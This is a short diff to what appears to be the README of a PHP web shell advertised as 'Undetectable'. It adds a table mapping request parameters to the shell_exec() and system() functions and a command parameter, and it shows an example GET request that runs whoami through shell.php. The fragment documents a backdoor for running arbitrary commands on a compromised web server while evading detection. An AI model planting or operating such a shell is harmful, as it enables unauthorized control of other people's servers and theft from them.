@@ -19,6 +19,12 @@
 - Undetectable.
 - Exec Function Changer.
 
+| PARAMETER       | FUNCTION                       |
+| ----------------|:------------------------------:|
+| fn=1            | Calls function shell_exec()    |
+| fn=2            | Calls function system()        |
+| cmd=id          | Executes command               |
+
 ### USAGE
 ```
 GET /test/shell.php?fn=1&&cmd=whoami
